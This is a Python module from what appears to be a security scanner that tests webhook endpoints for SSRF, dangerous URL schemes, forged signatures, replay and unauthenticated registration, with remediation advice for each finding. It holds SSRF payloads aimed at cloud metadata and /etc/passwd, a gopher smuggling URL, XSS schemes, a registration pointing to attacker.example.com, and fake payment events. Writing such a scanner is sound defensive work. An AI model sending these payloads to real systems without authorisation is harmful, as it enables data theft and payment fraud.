"""Webhook/callback security — callback URL validation, signature verification.

Phase 4 item #61.
"""

from __future__ import annotations

import json
import logging
import time
from dataclasses import dataclass
from typing import Any, List
from urllib.parse import urlparse

from krumpa.core import Finding, Severity, Target

logger = logging.getLogger("krumpa.openkrump.webhook_security")


# ------------------------------------------------------------------
# Data models
# ------------------------------------------------------------------

@dataclass
class WebhookEndpoint:
    """A webhook registration endpoint."""
    url: str
    method: str = "POST"
    accepts_url: bool = False
    url_param: str = ""
    requires_auth: bool = False


@dataclass
class WebhookTestResult:
    """Result of a webhook security test."""
    test_name: str
    passed: bool = False
    details: str = ""
    status_code: int = 0
    response: str = ""


# ------------------------------------------------------------------
# SSRF / URL validation test payloads
# ------------------------------------------------------------------

SSRF_CALLBACK_URLS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    # Internal networks
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    # DNS rebinding
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
    # Protocol smuggling
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/_EHLO",
    "dict://127.0.0.1:11211/stat",
    # IP bypasses
    "http://0x7f.0x00.0x00.0x01/",
    "http://2130706433/",  # 127.0.0.1 as integer
    "http://017700000001/",  # 127.0.0.1 as octal
    "http://127.1/",
    # URL confusion
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1#@evil.com/",
]

# Webhook delivery path patterns
WEBHOOK_PATHS = [
    "/webhooks", "/webhook", "/hooks", "/hook",
    "/api/webhooks", "/api/webhook",
    "/api/hooks", "/api/hook",
    "/callbacks", "/callback",
    "/api/callbacks", "/api/callback",
    "/notify", "/notifications",
    "/api/notify", "/api/notifications",
    "/events", "/api/events",
    "/subscribe", "/api/subscribe",
    "/integrations", "/api/integrations",
]


class WebhookSecurityAnalyzer:
    """Analyze webhook/callback endpoint security.

    Tests:
    - SSRF via webhook callback URL (internal URL injection)
    - Missing URL validation (scheme, host, port restrictions)
    - Webhook signature verification bypass
    - Replay attack protection (missing timestamp validation)
    - Unauthenticated webhook registration
    - Information disclosure in webhook payloads
    """

    def __init__(self) -> None:
        self._client: Any = None
        self._owns_client: bool = True

    # ----------------------------------------------------------
    # Public API
    # ----------------------------------------------------------

    async def analyze(self, target: Target) -> List[Finding]:
        """Run all webhook security checks."""
        findings: List[Finding] = []
        if not self._client:
            return findings

        url = target.url
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Discover webhook endpoints
        endpoints = await self._discover_webhooks(base, target)

        if not endpoints:
            return findings

        for ep in endpoints:
            # 2. Test SSRF via callback URL
            findings.extend(await self._test_ssrf_callback(ep, target))

            # 3. Test URL validation
            findings.extend(await self._test_url_validation(ep, target))

            # 4. Test signature verification
            findings.extend(await self._test_signature_bypass(ep, target))

            # 5. Test replay protection
            findings.extend(await self._test_replay_protection(ep, target))

            # 6. Test unauthenticated registration
            findings.extend(await self._test_unauth_registration(ep, target))

        return findings

    # ----------------------------------------------------------
    # Webhook discovery
    # ----------------------------------------------------------

    async def _discover_webhooks(
        self, base: str, target: Target,
    ) -> List[WebhookEndpoint]:
        """Discover webhook registration endpoints."""
        endpoints: List[WebhookEndpoint] = []

        for path in WEBHOOK_PATHS:
            probe_url = f"{base}{path}"
            try:
                # Try GET to see if endpoint exists
                resp = await self._client.request("GET", probe_url)

                if resp.status_code in (200, 401, 403, 405):
                    ep = WebhookEndpoint(url=probe_url)

                    if resp.status_code in (401, 403):
                        ep.requires_auth = True

                    # Check if it accepts URL parameter
                    text = resp.text.lower()
                    for param in ("url", "callback_url", "webhook_url",
                                  "target_url", "endpoint", "destination"):
                        if param in text:
                            ep.accepts_url = True
                            ep.url_param = param
                            break

                    endpoints.append(ep)

                # Also try OPTIONS
                if resp.status_code == 405:
                    opts = await self._client.request("OPTIONS", probe_url)
                    if "POST" in opts.headers.get("allow", ""):
                        endpoints.append(WebhookEndpoint(
                            url=probe_url, method="POST",
                        ))

            except Exception:
                continue

        return endpoints

    # ----------------------------------------------------------
    # SSRF via callback
    # ----------------------------------------------------------

    async def _test_ssrf_callback(
        self, endpoint: WebhookEndpoint, target: Target,
    ) -> List[Finding]:
        """Test if webhook callback URLs allow internal network access."""
        findings: List[Finding] = []

        url_param = endpoint.url_param or "url"

        for evil_url in SSRF_CALLBACK_URLS[:8]:  # Limit probing
            payload = {
                url_param: evil_url,
                "events": ["*"],
            }

            try:
                resp = await self._client.request(
                    "POST", endpoint.url,
                    json_body=payload,
                )

                # If server accepts the URL without validation
                if resp.status_code in (200, 201, 202):
                    findings.append(Finding(
                        title=f"Webhook SSRF: internal URL accepted as callback",
                        description=(
                            f"The webhook registration endpoint accepted an "
                            f"internal/dangerous URL as the callback destination. "
                            f"When the webhook fires, the server will make a "
                            f"request to the attacker-controlled internal URL."
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=(
                            f"Endpoint: {endpoint.url}\n"
                            f"Callback URL: {evil_url}\n"
                            f"Status: {resp.status_code}\n"
                            f"Response: {resp.text[:200]}"
                        ),
                        remediation=(
                            "Validate webhook callback URLs against an allowlist. "
                            "Block internal IPs (RFC 1918, loopback, link-local). "
                            "Resolve DNS before validation to prevent DNS rebinding. "
                            "Block non-HTTP(S) schemes."
                        ),
                        cwe=918,
                        tags=["webhook", "ssrf", "callback", "openkrump"],
                    ))
                    break  # One proof is enough

            except Exception:
                continue

        return findings

    # ----------------------------------------------------------
    # URL validation
    # ----------------------------------------------------------

    async def _test_url_validation(
        self, endpoint: WebhookEndpoint, target: Target,
    ) -> List[Finding]:
        """Test URL validation strength on webhook callbacks."""
        findings: List[Finding] = []

        # Dangerous schemes that shouldn't be allowed
        scheme_payloads = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://evil.com/payload",
            "file:///etc/passwd",
        ]

        url_param = endpoint.url_param or "url"

        for payload in scheme_payloads:
            try:
                resp = await self._client.request(
                    "POST", endpoint.url,
                    json_body={url_param: payload, "events": ["*"]},
                )

                if resp.status_code in (200, 201, 202):
                    findings.append(Finding(
                        title=f"Webhook accepts dangerous URL scheme: {payload[:30]}",
                        description=(
                            f"The webhook endpoint accepted a non-HTTP URL scheme "
                            f"as a callback destination. Only https:// (and "
                            f"optionally http://) should be accepted."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"Endpoint: {endpoint.url}\n"
                            f"Payload: {payload}\n"
                            f"Status: {resp.status_code}"
                        ),
                        remediation=(
                            "Strictly validate webhook URLs to only accept "
                            "https:// schemes. Reject all other URL schemes."
                        ),
                        cwe=20,
                        tags=["webhook", "url-validation", "openkrump"],
                    ))
                    break

            except Exception:
                continue

        return findings

    # ----------------------------------------------------------
    # Signature bypass
    # ----------------------------------------------------------

    async def _test_signature_bypass(
        self, endpoint: WebhookEndpoint, target: Target,
    ) -> List[Finding]:
        """Test if webhook delivery can be faked (no signature verification)."""
        findings: List[Finding] = []

        # Try delivering a fake webhook payload without proper signature
        fake_payloads = [
            {
                "event": "payment.completed",
                "data": {"amount": 9999, "currency": "USD"},
            },
            {
                "type": "checkout.session.completed",
                "data": {"object": {"id": "cs_fake_123"}},
            },
            {
                "action": "completed",
                "resource": {"id": "fake_order", "status": "paid"},
            },
        ]

        # Common webhook delivery endpoints
        delivery_paths = [
            "/webhooks/receive", "/webhook/receive",
            "/api/webhooks/incoming", "/api/webhook/callback",
            "/hooks/stripe", "/hooks/paypal", "/hooks/github",
            "/webhooks/handler", "/api/hooks/handler",
        ]

        parsed = urlparse(endpoint.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in delivery_paths:
            for payload in fake_payloads:
                try:
                    resp = await self._client.request(
                        "POST", f"{base}{path}",
                        json_body=payload,
                        headers={
                            "X-Webhook-Signature": "fake_signature_abc123",
                            "X-Hub-Signature-256": "sha256=invalid",
                        },
                    )

                    if resp.status_code == 200:
                        findings.append(Finding(
                            title=f"Webhook delivery accepted without valid signature",
                            description=(
                                f"A webhook delivery endpoint accepted a payload "
                                f"with a fake/invalid signature. This allows an "
                                f"attacker to forge webhook events and trigger "
                                f"server-side actions (e.g., fake payment confirmations)."
                            ),
                            severity=Severity.HIGH,
                            target=target,
                            evidence=(
                                f"Endpoint: {base}{path}\n"
                                f"Fake signature: X-Webhook-Signature=fake_signature_abc123\n"
                                f"Payload: {json.dumps(payload)[:200]}\n"
                                f"Status: {resp.status_code}"
                            ),
                            remediation=(
                                "Always verify webhook signatures using HMAC-SHA256 "
                                "with the shared secret. Reject requests with missing "
                                "or invalid signatures. Use constant-time comparison."
                            ),
                            cwe=345,
                            tags=["webhook", "signature-bypass", "openkrump"],
                        ))
                        return findings  # One proof is enough

                except Exception:
                    continue

        return findings

    # ----------------------------------------------------------
    # Replay protection
    # ----------------------------------------------------------

    async def _test_replay_protection(
        self, endpoint: WebhookEndpoint, target: Target,
    ) -> List[Finding]:
        """Test for webhook replay attack protection."""
        findings: List[Finding] = []

        # Send a webhook with an old timestamp
        old_timestamp = str(int(time.time()) - 86400)  # 24 hours ago
        payload = {
            "event": "test",
            "timestamp": old_timestamp,
            "data": {},
        }

        parsed = urlparse(endpoint.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        delivery_paths = [
            "/webhooks/receive", "/webhook/receive",
            "/api/webhooks/incoming",
        ]

        for path in delivery_paths:
            try:
                resp = await self._client.request(
                    "POST", f"{base}{path}",
                    json_body=payload,
                    headers={
                        "X-Webhook-Timestamp": old_timestamp,
                    },
                )

                if resp.status_code == 200:
                    findings.append(Finding(
                        title="Webhook endpoint accepts old timestamps (replay attack)",
                        description=(
                            "The webhook delivery endpoint accepted a payload with "
                            "a timestamp from 24 hours ago. This allows replay attacks "
                            "where captured webhook payloads are re-sent to trigger "
                            "duplicate actions."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"Endpoint: {base}{path}\n"
                            f"Old timestamp: {old_timestamp}\n"
                            f"Status: {resp.status_code}"
                        ),
                        remediation=(
                            "Validate webhook timestamps and reject payloads older "
                            "than a tolerance window (e.g., 5 minutes). Store and "
                            "check webhook IDs to prevent replay."
                        ),
                        cwe=294,
                        tags=["webhook", "replay", "timestamp", "openkrump"],
                    ))
                    return findings

            except Exception:
                continue

        return findings

    # ----------------------------------------------------------
    # Unauthenticated registration
    # ----------------------------------------------------------

    async def _test_unauth_registration(
        self, endpoint: WebhookEndpoint, target: Target,
    ) -> List[Finding]:
        """Test if webhooks can be registered without authentication."""
        findings: List[Finding] = []

        if endpoint.requires_auth:
            return findings  # Already requires auth

        try:
            resp = await self._client.request(
                "POST", endpoint.url,
                json_body={
                    "url": "https://attacker.example.com/hook",
                    "events": ["*"],
                },
                # No auth headers
            )

            if resp.status_code in (200, 201, 202):
                findings.append(Finding(
                    title="Webhook registration without authentication",
                    description=(
                        "The webhook registration endpoint accepted a new webhook "
                        "subscription without any authentication. An attacker can "
                        "register webhooks to receive sensitive event data."
                    ),
                    severity=Severity.HIGH,
                    target=target,
                    evidence=(
                        f"Endpoint: {endpoint.url}\n"
                        f"Status: {resp.status_code}\n"
                        f"Response: {resp.text[:200]}"
                    ),
                    remediation=(
                        "Require authentication for webhook registration. "
                        "Implement webhook verification (challenge-response) "
                        "to confirm URL ownership."
                    ),
                    cwe=306,
                    tags=["webhook", "auth", "registration", "openkrump"],
                ))

        except Exception:
            pass

        return findings
